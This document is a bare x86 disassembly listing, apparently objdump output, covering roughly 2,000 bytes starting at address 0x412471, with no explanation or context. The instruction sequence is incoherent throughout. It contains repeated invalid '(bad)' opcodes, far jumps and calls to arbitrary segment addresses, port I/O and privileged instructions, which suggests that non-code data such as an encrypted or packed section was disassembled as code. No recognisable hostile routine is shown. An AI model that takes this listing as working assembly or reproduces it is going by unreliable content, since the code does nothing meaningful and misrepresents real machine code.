  412471:	ret    0x6b0b
  412474:	add    eax,0x8ebaba73
  412479:	push   ecx
  41247a:	jbe    0x412410
  41247c:	inc    ebp
  41247d:	pop    esp
  41247e:	sbb    eax,0xc0df54bf
  412483:	adc    ch,BYTE PTR [ebp+0xbd5987d]
  412489:	adc    al,0xd1
  41248b:	mov    cl,0xdb
  41248d:	sahf   
  41248e:	or     BYTE PTR [edx],bh
  412490:	out    dx,eax
  412491:	fcomp  st(1)
  412493:	mov    esp,0x423dc960
  412498:	rcl    BYTE PTR [ebx],1
  41249a:	test   al,0xe3
  41249c:	(bad)  
  41249d:	push   ebx
  41249e:	mov    dl,0x34
  4124a0:	dec    ebp
  4124a1:	mov    cl,0xed
  4124a3:	loopne 0x4124fc
  4124a5:	sub    al,0x5b
  4124a7:	jmp    0xfb18:0x433fbce1
  4124ae:	outs   dx,BYTE PTR ds:[esi]
  4124af:	sub    eax,0x5f2fc990
  4124b4:	add    BYTE PTR [ebp+0x1f],bl
  4124b7:	jns    0x412439
  4124b9:	and    DWORD PTR [eax+0x55de87c6],0x293209b4
  4124c3:	pop    ecx
  4124c4:	xor    ecx,DWORD PTR [esi+0x4fc7d99a]
  4124ca:	xor    al,0x5
  4124cc:	pusha  
  4124cd:	ss ins DWORD PTR es:[edi],dx
  4124cf:	lds    ebp,FWORD PTR [edx+0x6e70fbfc]
  4124d5:	dec    ebp
  4124d6:	cli    
  4124d7:	jae    0x41253b
  4124d9:	gs ret 
  4124db:	xor    bh,BYTE PTR [eax-0x27]
  4124de:	jae    0x41249f
  4124e0:	dec    esi
  4124e1:	adc    bl,cl
  4124e3:	ja     0x4124c6
  4124e5:	push   edi
  4124e6:	push   esi
  4124e7:	das    
  4124e8:	ins    DWORD PTR es:[edi],dx
  4124e9:	mov    ch,0xc1
  4124eb:	pop    ebx
  4124ec:	cdq    
  4124ed:	mov    ch,0xf8
  4124ef:	retf   0x2f5e
  4124f2:	adc    DWORD PTR [ecx+0x3e],edi
  4124f5:	nop
  4124f6:	call   0x3cc23032
  4124fb:	hlt    
  4124fc:	fucomip st,st(7)
  4124fe:	je     0x26430d97
  412504:	jne    0x4124cb
  412506:	call   0x6f4b:0xd284d610
  41250d:	jmp    0x7ffdd5f5
  412512:	lods   al,BYTE PTR ds:[esi]
  412513:	cmp    dl,BYTE PTR es:[esi-0x57d280e4]
  41251a:	cmc    
  41251b:	scas   eax,DWORD PTR es:[edi]
  41251c:	push   eax
  41251d:	inc    edi
  41251e:	jnp    0x412577
  412520:	mov    ds,WORD PTR [edi-0x2e]
  412523:	ds pop edi
  412525:	je     0x4124ee
  412527:	xor    eax,0x5700feea
  41252c:	fidiv  WORD PTR [ebp-0xc]
  41252f:	push   ss
  412530:	pop    ebp
  412531:	lock jmp 0xb6f32d93
  412537:	popf   
  412538:	shl    ch,cl
  41253a:	fsubr  DWORD PTR [ebx]
  41253c:	jl     0x41258b
  41253e:	mov    al,0xf2
  412540:	mov    cl,0xb7
  412542:	mov    ds:0xa365df63,eax
  412547:	jmp    0x3b5c:0x8e0e8d1
  41254e:	outs   dx,DWORD PTR ds:[esi]
  41254f:	stc    
  412550:	sbb    ecx,eax
  412552:	sub    dl,BYTE PTR [eax+0x2a]
  412555:	sar    BYTE PTR [ebx+0x2f47c4b9],cl
  41255b:	mov    bh,0x15
  41255d:	adc    esi,DWORD PTR [edx-0xf5e78bb]
  412563:	repz rcl BYTE PTR [edx],1
  412566:	ds cs mov ecx,0xe1546927
  41256d:	pusha  
  41256e:	adc    eax,0x959c31f4
  412573:	icebp  
  412574:	cwde   
  412575:	dec    ebp
  412576:	push   es
  412577:	and    BYTE PTR [edx+0x4a49c640],ah
  41257d:	or     ebx,DWORD PTR [esi]
  41257f:	mov    WORD PTR [esi+ebx*1+0x37c8a9f2],ds
  412586:	or     al,0x57
  412588:	out    0x60,al
  41258a:	and    al,0xb
  41258c:	out    dx,eax
  41258d:	loop   0x41251e
  41258f:	int3   
  412590:	mov    ch,0xc3
  412592:	add    ch,dh
  412594:	xchg   edi,eax
  412595:	int3   
  412596:	push   ecx
  412597:	and    DWORD PTR [ebp-0x7b],esp
  41259a:	addr16 jmp 0xf95b5753
  4125a0:	(bad)
  4125a4:	jmp    0x8cee4272
  4125a9:	sub    ecx,DWORD PTR [ecx+0x64be9637]
  4125af:	push   ss
  4125b0:	arpl   WORD PTR [edi],sp
  4125b2:	cmp    dl,ah
  4125b4:	and    BYTE PTR [edx+ecx*2-0x5995edcf],dl
  4125bb:	lock ins BYTE PTR es:[edi],dx
  4125bd:	mov    dh,0xc8
  4125bf:	ss inc ebp
  4125c1:	jg     0x412559
  4125c3:	pop    ebp
  4125c4:	cmp    eax,0xb6705aad
  4125c9:	dec    esp
  4125ca:	ffreep st(7)
  4125cc:	add    dl,BYTE PTR ds:0x8254a052
  4125d2:	pushf  
  4125d3:	ror    BYTE PTR [edi+0x5b],1
  4125d6:	pop    ecx
  4125d7:	loope  0x412586
  4125d9:	sbb    DWORD PTR [ebx+0x1],edi
  4125dc:	dec    eax
  4125dd:	mov    dh,0x46
  4125df:	(bad)  
  4125e0:	dec    ebx
  4125e1:	lock retf 
  4125e3:	jb     0x412652
  4125e5:	xor    DWORD PTR [ecx+0x137fb87e],esi
  4125eb:	ret    0x8d18
  4125ee:	jmp    0xdc42:0xf522d13e
  4125f5:	add    ax,0xc75f
  4125f9:	pop    ebp
  4125fa:	jp     0x412611
  4125fc:	jns    0x41263f
  4125fe:	fdiv   DWORD PTR ds:0x7874b652
  412604:	push   cs
  412605:	call   0x39b8:0xc120aead
  41260c:	popf   
  41260d:	add    esi,DWORD PTR [esi]
  41260f:	xchg   ebx,eax
  412610:	ret    
  412611:	jne    0x4125de
  412613:	pop    ebp
  412614:	dec    ebp
  412615:	adc    BYTE PTR ds:0x4c2fd64,ah
  41261b:	mov    ah,0x71
  41261d:	sbb    edi,DWORD PTR [edx-0x2e]
  412620:	jo     0x41263e
  412622:	call   0xdf75:0xc462cadc
  412629:	cmp    esp,DWORD PTR [ebx+0x3dc2f030]
  41262f:	add    BYTE PTR [ebp+0xd],ch
  412632:	fwait
  412633:	test   ebx,ebx
  412635:	push   eax
  412636:	sub    DWORD PTR [esi],ebp
  412638:	sti    
  412639:	call   0xcfe2:0xe54f1b8d
  412640:	or     DWORD PTR [esi-0x609b5078],edx
  412646:	sub    edx,ebp
  412648:	pop    ds
  412649:	cdq    
  41264a:	inc    edi
  41264b:	lods   eax,DWORD PTR ds:[esi]
  41264c:	push   ebx
  41264d:	shr    edi,0x14
  412650:	mov    bl,0x75
  412652:	and    esi,edx
  412654:	pop    eax
  412655:	xor    eax,DWORD PTR [eax+eax*2-0x44b90e11]
  41265c:	xchg   ecx,eax
  41265d:	ror    DWORD PTR [edx+0x52a8c634],cl
  412663:	in     eax,0x11
  412665:	jecxz  0x412643
  412667:	out    0xa,al
  412669:	push   edx
  41266a:	ins    DWORD PTR es:[edi],dx
  41266b:	inc    esi
  41266c:	stos   BYTE PTR es:[edi],al
  41266d:	ja     0x4125fa
  41266f:	scas   al,BYTE PTR es:[edi]
  412670:	push   edi
  412671:	icebp  
  412672:	ins    BYTE PTR es:[edi],dx
  412673:	loop   0x41267f
  412675:	popa   
  412676:	mov    eax,0x30d95efe
  41267b:	test   DWORD PTR [eax+0x12],ebp
  41267e:	out    0x21,eax
  412680:	inc    DWORD PTR [ebx+0x25]
  412683:	mov    BYTE PTR [ecx-0x7a],dh
  412686:	mov    ds:0x15200ae0,eax
  41268b:	xchg   edx,eax
  41268c:	clc    
  41268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41268e:	jmp    0x412657
  412690:	es push ss
  412692:	aaa    
  412693:	mov    ch,0xbb
  412695:	dec    esi
  412696:	sub    al,0xef
  412698:	mov    esi,0x2931303
  41269d:	pop    ds
  41269e:	or     dl,BYTE PTR [edx-0x5e]
  4126a1:	sbb    BYTE PTR [ebp+0x37],bl
  4126a4:	mov    WORD PTR [edi],fs
  4126a6:	mov    al,0x8e
  4126a8:	leave  
  4126a9:	mov    eax,0x4434660c
  4126ae:	pop    ecx
  4126af:	and    BYTE PTR [edi+0x22],dh
  4126b2:	outs   dx,BYTE PTR ds:[esi]
  4126b3:	je     0x412637
  4126b5:	and    eax,0x6bd7f9d6
  4126ba:	dec    edi
  4126bb:	add    al,0xa3
  4126bd:	or     edx,ebx
  4126bf:	mov    edx,0x9f30c542
  4126c4:	mov    bl,0x44
  4126c6:	leave  
  4126c7:	cmp    dl,bl
  4126c9:	test   cl,0x95
  4126cc:	mov    eax,ds:0xab221139
  4126d1:	pop    ds
  4126d2:	js     0x4126d6
  4126d4:	out    0xea,al
  4126d6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d8:	int    0x26
  4126da:	pop    edx
  4126db:	or     al,0x70
  4126dd:	fist   DWORD PTR [esi]
  4126df:	jmpw   0xc1a6
  4126e3:	mov    ecx,0x950df50f
  4126e8:	int    0xed
  4126ea:	sbb    al,0xdf
  4126ec:	outs   dx,DWORD PTR ds:[esi]
  4126ed:	sti    
  4126ee:	or     ch,ch
  4126f0:	out    dx,eax
  4126f1:	cmp    bl,BYTE PTR [esi+0x67]
  4126f4:	out    0x78,eax
  4126f6:	xchg   ecx,eax
  4126f7:	ror    ah,0xdd
  4126fa:	sub    DWORD PTR [edi-0x30],edi
  4126fd:	test   DWORD PTR [eax-0x7f],0xa8396e38
  412704:	mov    BYTE PTR [ebp-0x51db07c9],ah
  41270a:	xor    ecx,DWORD PTR [eax-0x1bb8b674]
  412710:	adc    dl,BYTE PTR [eax-0x15d18ad]
  412716:	push   esp
  412717:	mov    al,0x4c
  412719:	and    DWORD PTR [edi+0x5b],esp
  41271c:	add    eax,0xa15858d0
  412721:	add    ch,BYTE PTR [ecx+0x78fb42d6]
  412727:	sub    BYTE PTR [ebx],dh
  412729:	dec    esp
  41272a:	push   esp
  41272b:	sub    ecx,DWORD PTR [edi-0x5ecf54]
  412731:	hlt    
  412732:	fdiv   st,st(1)
  412734:	call   0x4ac0:0x415e9507
  41273b:	cmp    DWORD PTR ds:0x461f6c39,esp
  412741:	nop
  412742:	or     al,0xa9
  412744:	push   0x1c636348
  412749:	enter  0x1a98,0x83
  41274d:	outs   dx,DWORD PTR ds:[esi]
  41274e:	enter  0x158c,0x9f
  412752:	scas   eax,DWORD PTR es:[edi]
  412753:	dec    esp
  412754:	sbb    dl,BYTE PTR [edx-0x26917bd2]
  41275a:	pop    ebx
  41275b:	add    dl,BYTE PTR ds:0xc1cb82ff
  412761:	leave  
  412762:	sbb    DWORD PTR [edi],esi
  412764:	and    dl,BYTE PTR [esi]
  412766:	ss nop
  412768:	add    esp,DWORD PTR [ecx]
  41276a:	mov    eax,ds:0x1cc40162
  41276f:	cmp    dh,BYTE PTR ds:0x20f75591
  412775:	and    DWORD PTR [edx+0x40],ebx
  412778:	sbb    al,0x2d
  41277a:	inc    ebx
  41277b:	jne    0x4127c0
  41277d:	mov    bh,0x5e
  41277f:	repnz xlat BYTE PTR ds:[ebx]
  412781:	sub    al,0xcd
  412783:	pop    edx
  412784:	cwde   
  412785:	dec    eax
  412786:	dec    esi
  412787:	cmp    dl,ah
  412789:	jecxz  0x412729
  41278b:	mov    esp,0x2f484b7c
  412790:	pop    eax
  412791:	jg     0x41276e
  412793:	add    eax,0xfdde4e2e
  412798:	mov    al,ds:0x310a1ea7
  41279d:	hlt    
  41279e:	mov    ds:0xe5dbfc9,eax
  4127a3:	dec    esp
  4127a4:	dec    eax
  4127a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127a6:	push   ds
  4127a7:	dec    esi
  4127a8:	call   0xafece04c
  4127ad:	fs push esi
  4127af:	push   edi
  4127b0:	adc    edi,ecx
  4127b2:	les    esp,FWORD PTR [edi-0x54]
  4127b5:	mov    al,0xac
  4127b7:	cld    
  4127b8:	inc    ebx
  4127b9:	jl     0x412795
  4127bb:	cs pop esp
  4127bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127be:	xor    DWORD PTR [edi],ebp
  4127c0:	mov    edi,0x88660470
  4127c5:	lock cmp DWORD PTR [eax-0xe],edx
  4127c9:	fst    DWORD PTR [ecx+0x2ab8908d]
  4127cf:	cmc    
  4127d0:	in     eax,dx
  4127d1:	jge    0x412810
  4127d3:	and    bh,BYTE PTR [ecx+0x1d]
  4127d6:	cld    
  4127d7:	sub    al,0x10
  4127d9:	xchg   DWORD PTR [edx],esi
  4127db:	xchg   esp,eax
  4127dc:	call   0xbc647f85
  4127e1:	cmp    BYTE PTR [edx],bl
  4127e3:	or     al,0x73
  4127e5:	ins    BYTE PTR es:[edi],dx
  4127e6:	add    esp,ebx
  4127e8:	jmp    0x3d38:0x81945980
  4127ef:	push   edx
  4127f0:	cmc    
  4127f1:	mov    esi,0x2f2f98cf
  4127f6:	dec    dx
  4127f8:	lods   al,BYTE PTR ds:[esi]
  4127f9:	xor    ecx,DWORD PTR [ebx+0x11]
  4127fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127fd:	jae    0x4127be
  4127ff:	(bad)  
  412801:	pop    ebx
  412802:	inc    esi
  412803:	test   DWORD PTR [ebx+0x21],eax
  412806:	leave  
  412807:	fiadd  WORD PTR [esi]
  412809:	das    
  41280a:	imul   ecx,DWORD PTR [edx+eiz*1-0x554e0a07],0x2c
  412812:	shl    BYTE PTR [edx+edi*2+0x55],cl
  412816:	inc    edi
  412817:	rcl    DWORD PTR [ebx+0x2c],1
  41281a:	pusha  
  41281b:	xchg   ebp,eax
  41281c:	inc    ebx
  41281d:	pop    esi
  41281e:	or     al,0xb0
  412820:	data16 jmp 0x4127bf
  412823:	imul   edx,DWORD PTR ds:0x12525e98,0xd
  41282a:	sub    al,0x6b
  41282c:	fwait
  41282d:	mov    ch,0xf1
  41282f:	and    ebp,DWORD PTR [ebp-0x2a18af4b]
  412835:	mov    eax,0x15efd40e
  41283a:	stos   DWORD PTR es:[edi],eax
  41283b:	repnz cli 
  41283d:	test   DWORD PTR [edx],edi
  41283f:	and    eax,0xda7f2281
  412844:	mov    ch,0x41
  412846:	cmp    dh,BYTE PTR [ebx-0x1d]
  412849:	je     0x4127d7
  41284b:	js     0x4127d6
  41284d:	out    dx,eax
  41284e:	aaa    
  41284f:	mov    ah,0x82
  412851:	jmp    0x41287f
  412853:	jns    0x4128a0
  412855:	pop    edx
  412856:	dec    esi
  412857:	mov    ah,0x84
  412859:	fwait
  41285a:	mov    DWORD PTR [ecx],ecx
  41285c:	outs   dx,BYTE PTR ds:[esi]
  41285d:	cli    
  41285e:	retf   
  41285f:	xor    al,0xdf
  412861:	push   ebp
  412862:	adc    DWORD PTR [ecx],ecx
  412864:	imul   ebx,edx,0x184c64c9
  41286a:	aam    0xfa
  41286c:	sbb    BYTE PTR [edi],0x5b
  41286f:	adc    DWORD PTR [eax],eax
  412871:	outs   dx,BYTE PTR ds:[esi]
  412872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412873:	stos   BYTE PTR es:[edi],al
  412874:	pop    ebp
  412875:	loope  0x41288d
  412877:	cmc    
  412878:	xchg   ecx,eax
  412879:	mov    ds:0x27f7ff25,al
  41287e:	popa   
  41287f:	loop   0x412889
  412881:	mov    ebx,0xc6895bd1
  412886:	hlt    
  412887:	cli    
  412888:	cwde   
  412889:	pushf  
  41288a:	cmp    ecx,DWORD PTR [ebp+0x5a]
  41288d:	ds in  eax,dx
  41288f:	add    BYTE PTR [ebx+0x7e773401],al
  412895:	stc    
  412896:	(bad)  
  412897:	int3   
  412898:	mov    BYTE PTR [edx-0x15],al
  41289b:	and    eax,0x81c1b442
  4128a0:	xlat   BYTE PTR ds:[ebx]
  4128a1:	int3   
  4128a2:	in     al,dx
  4128a3:	in     al,0x7e
  4128a5:	outs   dx,DWORD PTR ds:[esi]
  4128a6:	jne    0x412905
  4128a8:	push   eax
  4128a9:	call   0xa7af:0x8f364b3a
  4128b0:	xor    esp,DWORD PTR [edx]
  4128b2:	outs   dx,BYTE PTR ds:[esi]
  4128b3:	(bad)  
  4128b4:	mov    esi,0xee569e52
  4128b9:	and    edi,0xffffffa0
  4128bc:	jb     0x4128e7
  4128be:	lea    esi,[ebp-0x1c691cf]
  4128c4:	inc    eax
  4128c5:	mov    bh,BYTE PTR [edi-0x360503c8]
  4128cb:	mov    eax,0x155bb58a
  4128d0:	ss loopne 0x412921
  4128d3:	xor    BYTE PTR [eax],cl
  4128d5:	xor    BYTE PTR [ebx+0x756f6381],dh
  4128db:	mov    bl,0xb1
  4128dd:	sub    ah,dl
  4128df:	jl     0x412927
  4128e1:	enter  0xbe5d,0xc
  4128e5:	mov    ecx,0x3b505585
  4128ea:	lock or DWORD PTR [eax],0xa
  4128ee:	mov    al,0x9e
  4128f0:	jp     0x4128ec
  4128f2:	aaa    
  4128f3:	dec    ebx
  4128f4:	(bad)
  4128f8:	push   ecx
  4128f9:	cmp    al,0xa7
  4128fb:	push   eax
  4128fc:	mov    ebp,ebp
  4128fe:	js     0x4128ee
  412900:	jg     0x4128a8
  412902:	mov    bl,0x1a
  412904:	xor    WORD PTR [esi-0x73],bp
  412908:	sub    BYTE PTR [edx-0xf270c80],0x53
  41290f:	ja     0x412989
  412911:	arpl   WORD PTR ss:[esi+0x1809f29f],di
  412918:	or     BYTE PTR [esi],dh
  41291a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291b:	jo     0x412969
  41291d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41291e:	xor    esi,DWORD PTR [ecx]
  412920:	jne    0x412953
  412922:	xchg   edx,eax
  412923:	cwde   
  412924:	fdivr  st(7),st
  412926:	ret    
  412927:	cmp    ch,ch
  412929:	dec    edi
  41292a:	mov    eax,0x4ca9aa8
  41292f:	inc    esi
  412930:	adc    bh,0xfb
  412933:	or     BYTE PTR [eax-0x1c],0x61
  412937:	sar    BYTE PTR [ebx],1
  412939:	sbb    BYTE PTR [edx-0x27],ch
  41293c:	or     BYTE PTR [esi],bh
  41293e:	shr    DWORD PTR [ebx+ecx*1],cl
  412941:	pop    ds
  412942:	or     ebx,DWORD PTR [edx-0x42]
  412945:	inc    ebx
  412946:	and    eax,edi
  412948:	or     eax,0x8bd46838
  41294d:	ins    DWORD PTR es:[edi],dx
  41294e:	xor    esp,DWORD PTR [esp+ecx*8-0x7c]
  412952:	mov    ds:0xbbb43bf9,eax
  412957:	add    cl,ah
  412959:	push   esi
  41295a:	pop    edx
  41295b:	pop    edx
  41295c:	and    edi,edi
  41295e:	jae    0x412931
  412960:	sbb    eax,0x1997df37
  412965:	(bad)  
  412966:	repnz mov esp,ds
  412969:	in     eax,0x36
  41296b:	sbb    ah,BYTE PTR [edi+0x4ba3cb3d]
  412971:	fwait
  412972:	pop    ebx
  412973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412974:	scas   eax,DWORD PTR es:[edi]
  412975:	and    al,BYTE PTR [ecx+0x28852650]
  41297b:	dec    esp
  41297c:	sbb    ebp,0xffffff8d
  41297f:	sahf   
  412980:	data16 jno 0x41292f
  412983:	dec    ecx
  412984:	(bad)
  412987:	test   DWORD PTR [edx+0x8cecb7a],edx
  41298d:	loopne 0x41298d
  41298f:	repz loope 0x4129c3
  412992:	retf   0x637c
  412995:	in     eax,0xc
  412997:	mov    eax,0x27424f3e
  41299c:	cdq    
  41299d:	stc    
  41299e:	add    DWORD PTR [eax+0x440a22d1],0x66
  4129a5:	and    BYTE PTR [edi+0x17a2419f],0xb3
  4129ac:	push   ecx
  4129ad:	into   
  4129ae:	and    DWORD PTR [ebx],0xe9f35cf9
  4129b4:	xlat   BYTE PTR ds:[ebx]
  4129b5:	xchg   esp,eax
  4129b6:	(bad)  
  4129b8:	push   edx
  4129b9:	mov    ds:0x9a472c67,al
  4129be:	mov    ds:0xddae878e,al
  4129c3:	rcl    ebp,0xc1
  4129c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c7:	and    DWORD PTR [eax-0x720d9c3f],edx
  4129cd:	repnz fisttp QWORD PTR [esi+0xfcedb60]
  4129d4:	sub    DWORD PTR [ebp-0x6098efeb],esi
  4129da:	jo     0x412a13
  4129dc:	sub    bl,BYTE PTR [eax+0x2b89c518]
  4129e2:	sbb    eax,edx
  4129e4:	leave  
  4129e5:	shl    ebp,1
  4129e7:	popf   
  4129e8:	(bad)  
  4129e9:	in     eax,dx
  4129ea:	jle    0x4129f8
  4129ec:	and    cl,BYTE PTR [ecx+0x24996041]
  4129f2:	imul   esp,ecx,0x74
  4129f5:	pushf  
  4129f6:	punpckldq mm5,mm2
  4129f9:	fnsave [eax]
  4129fb:	dec    edx
  4129fc:	iret   
  4129fd:	mov    edi,0x17d54176
  412a02:	ret    
  412a03:	fidiv  WORD PTR [esi+0x67df47c8]
  412a09:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412a0b:	daa    
  412a0c:	out    dx,eax
  412a0d:	jge    0x41298f
  412a0f:	xor    ecx,DWORD PTR [esp+eax*8]
  412a12:	mov    DWORD PTR [eax-0x4b],ebx
  412a15:	dec    edi
  412a16:	push   cs
  412a17:	nop
  412a18:	mov    esi,0x17689ec6
  412a1d:	ret    0x6c11
  412a20:	cs mov cl,0x6f
  412a23:	clc    
  412a24:	mov    dl,0x61
  412a26:	mov    ds:0x1ce7f1e3,al
  412a2b:	imul   ecx,DWORD PTR [ebx],0x71
  412a2e:	dec    edi
  412a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a30:	xor    BYTE PTR [ebx-0x79],dh
  412a33:	retf   
  412a34:	popa   
  412a35:	mov    cs,WORD PTR [ebx+0x17]
  412a38:	dec    esp
  412a39:	pop    ebp
  412a3a:	cmp    al,0x26
  412a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a3d:	test   BYTE PTR [edx-0x19529e0f],ah
  412a43:	out    dx,al
  412a44:	and    eax,0x789b4d
  412a49:	aas    
  412a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a4b:	stos   BYTE PTR es:[edi],al
  412a4c:	dec    ecx
  412a4d:	in     eax,dx
  412a4e:	adc    ebx,DWORD PTR [edx+0x3fab7de7]
  412a54:	push   ebp
  412a55:	mov    al,ds:0xe2699aaa
  412a5a:	mov    ebp,gs
  412a5c:	dec    ecx
  412a5d:	ficomp WORD PTR [ecx-0xd]
  412a60:	ins    DWORD PTR es:[edi],dx
  412a61:	daa    
  412a62:	jo     0x412a69
  412a64:	icebp  
  412a65:	outs   dx,DWORD PTR ds:[esi]
  412a66:	fisttp QWORD PTR [eax+0x1d]
  412a69:	lds    ebx,FWORD PTR [ebp-0xf]
  412a6c:	jp     0x412aaf
  412a6e:	sub    edx,edx
  412a70:	xchg   DWORD PTR [ecx-0x3434806e],edx
  412a76:	mov    bl,0x5b
  412a78:	pop    esi
  412a79:	cmp    eax,0x6af6c6
  412a7e:	push   eax
  412a7f:	mov    ebx,0x881b13a7
  412a84:	(bad)  
  412a85:	loopne 0x412a26
  412a87:	and    bl,BYTE PTR [ebx+ebx*8-0xe]
  412a8b:	sub    al,0x1b
  412a8d:	div    BYTE PTR [ecx]
  412a8f:	imul   eax,ebx,0x5a
  412a92:	cmp    BYTE PTR [esp+edi*8],0x43
  412a96:	add    BYTE PTR ds:0x1e119664,bl
  412a9c:	adc    edi,DWORD PTR [edi-0x3f1b8417]
  412aa2:	add    al,BYTE PTR [ecx+ebx*1+0x27]
  412aa6:	inc    esi
  412aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa8:	and    ebx,DWORD PTR [edx]
  412aaa:	aaa    
  412aab:	xor    edi,edi
  412aad:	shr    DWORD PTR [edx],1
  412aaf:	dec    eax
  412ab0:	pop    esi
  412ab1:	cmp    BYTE PTR [ecx],dh
  412ab3:	fcomip st,st(4)
  412ab5:	jne    0x412adb
  412ab7:	sub    ebp,DWORD PTR ds:0xb162c02d
  412abd:	add    cl,0x22
  412ac0:	adc    al,0x7b
  412ac2:	imul   edi,esp,0x61
  412ac5:	xchg   edi,eax
  412ac6:	pusha  
  412ac7:	aas    
  412ac8:	in     eax,0x1b
  412aca:	fsub   DWORD PTR [esi+0x7049e867]
  412ad0:	fbstp  TBYTE PTR ds:0x4180288a
  412ad6:	icebp  
  412ad7:	popf   
  412ad8:	aam    0xc8
  412ada:	and    eax,0x2df5470b
  412adf:	lock loope 0x412ad5
  412ae2:	and    eax,0x21c75797
  412ae7:	dec    edx
  412ae8:	mov    ch,0xd2
  412aea:	sbb    al,0x52
  412aec:	and    DWORD PTR [ebp-0x6a5c14fe],edx
  412af2:	dec    ebp
  412af3:	cmp    BYTE PTR [ecx-0x51f80711],bh
  412af9:	loope  0x412b44
  412afb:	mov    eax,0x995b9cd8
  412b00:	adc    BYTE PTR [edx-0x5e],bh
  412b03:	clc    
  412b04:	jns    0x412b1d
  412b06:	aad    0x4b
  412b08:	adc    ah,BYTE PTR [esi*4-0x67205b3]
  412b0f:	test   BYTE PTR [eax-0x4c960a6e],dl
  412b15:	mov    bl,0x2a
  412b17:	pop    ebp
  412b18:	hlt    
  412b19:	fmul   QWORD PTR [edi+0x71ce72c7]
  412b1f:	add    DWORD PTR [ebx],eax
  412b21:	fucom  st(3)
  412b23:	pop    ebx
  412b24:	mov    ebx,0xdf2b60a8
  412b29:	and    al,BYTE PTR cs:[edi+0x370e06d5]
  412b30:	idiv   ecx
  412b32:	out    0x90,eax
  412b34:	adc    bh,ah
  412b36:	inc    ebx
  412b37:	cmp    eax,0xa2b8bb4d
  412b3c:	xchg   esp,eax
  412b3d:	pop    edx
  412b3e:	call   0x5f50d28f
  412b43:	mov    bh,0x82
  412b45:	inc    edi
  412b46:	std    
  412b47:	cwde   
  412b48:	inc    edx
  412b49:	xchg   al,ah
  412b4b:	push   edi
  412b4c:	fwait
  412b4d:	adc    al,0x97
  412b4f:	shr    DWORD PTR [ebp-0x1f],cl
  412b52:	(bad)  
  412b53:	imul   ebx,DWORD PTR [eax+ebp*4-0x17],0xffffffa4
  412b58:	dec    edi
  412b59:	dec    esp
  412b5a:	aad    0x71
  412b5c:	outs   dx,DWORD PTR ds:[esi]
  412b5d:	adc    al,0x14
  412b5f:	bound  ebx,QWORD PTR [ebx-0x45]
  412b62:	xor    BYTE PTR [edi],bl
  412b64:	inc    esi
  412b65:	test   DWORD PTR [ecx+0x4c83349f],ecx
  412b6b:	mov    ds:0x86d4541b,eax
  412b70:	retf   0x8fd3
  412b73:	push   cs
  412b74:	fwait
  412b75:	jb     0x412b3b
  412b77:	sub    BYTE PTR [edx],ah
  412b79:	xlat   BYTE PTR ds:[ebx]
  412b7a:	cld    
  412b7b:	aaa    
  412b7c:	lea    ecx,[ecx-0x3296db76]
  412b82:	fsubr  QWORD PTR [edi-0x71]
  412b85:	dec    edi
  412b86:	pushf  
  412b87:	lods   eax,DWORD PTR ds:[esi]
  412b88:	lods   eax,DWORD PTR ds:[esi]
  412b89:	and    BYTE PTR [eax+0x4d],cl
  412b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b8d:	xchg   esp,eax
  412b8e:	jp     0x412c0d
  412b90:	dec    esp
  412b91:	ror    DWORD PTR [eax],cl
  412b93:	sbb    DWORD PTR [edi],ebx
  412b95:	je     0x412b56
  412b97:	inc    esi
  412b98:	push   ebp
  412b99:	imul   edi,DWORD PTR ds:[ebx+edx*1-0x10],0x7d
  412b9f:	add    BYTE PTR [esi],dl
  412ba1:	mov    BYTE PTR [ebp-0x13219e9a],dh
  412ba7:	scas   al,BYTE PTR es:[edi]
  412ba8:	or     ebp,esp
  412baa:	loopne 0x412c16
  412bac:	cld    
  412bad:	lods   eax,DWORD PTR ds:[esi]
  412bae:	sbb    BYTE PTR [edx+0x9],0xe7
  412bb2:	dec    ecx
  412bb3:	cs popa 
  412bb5:	and    esi,DWORD PTR [eax-0x7d7dac20]
  412bbb:	pushf  
  412bbc:	pop    edx
  412bbd:	xor    esp,ebp
  412bbf:	xchg   BYTE PTR [edx-0x39],al
  412bc2:	jg     0x412c27
  412bc4:	addr16 sti 
  412bc6:	mov    edi,0xecd56d95
  412bcb:	fist   DWORD PTR [edx+0x5f]
  412bce:	adc    al,0xdc
  412bd0:	fnstcw WORD PTR [ecx+0x56]
  412bd3:	sub    al,0x2
  412bd5:	hlt    
  412bd6:	cmp    dh,BYTE PTR [ebx-0x6bf78e92]
  412bdc:	shl    eax,cl
  412bde:	dec    eax
  412bdf:	push   esp
  412be0:	mov    ch,0x89
  412be2:	push   es
  412be3:	mov    ebp,0x137a7589
  412be8:	mov    bh,0xe8
  412bea:	cmp    al,0xf0
  412bec:	dec    ebp
  412bed:	jmp    0x412c00
  412bef:	xor    DWORD PTR [ecx+eiz*1-0x30a871c8],ebx
  412bf6:	stc    
  412bf7:	jl     0x412c25
  412bf9:	data16 into 
  412bfb:	mov    al,ds:0x361bfe87
  412c00:	or     ch,cl
  412c02:	pop    ds
  412c03:	and    al,0xd5
  412c05:	cwde   
  412c06:	cmp    DWORD PTR [ecx-0x59],esi
  412c09:	jmp    0x862c30d1
  412c0e:	jae    0x412c69
  412c10:	aaa    
  412c11:	inc    ebp
  412c12:	mov    esi,0xa4b621a4
  412c17:	cmp    eax,0x209ced77
  412c1c:	sbb    eax,0x6604e26
  412c21:	loope  0x412c6a
  412c23:	or     DWORD PTR [edx-0xe6cec0d],esi
  412c29:	add    ebp,DWORD PTR [edx-0x7e]
  412c2c:	xor    ecx,DWORD PTR ds:0x9fb4c5e0
  412c32:	stos   BYTE PTR es:[edi],al
  412c33:	or     eax,0xecf25143
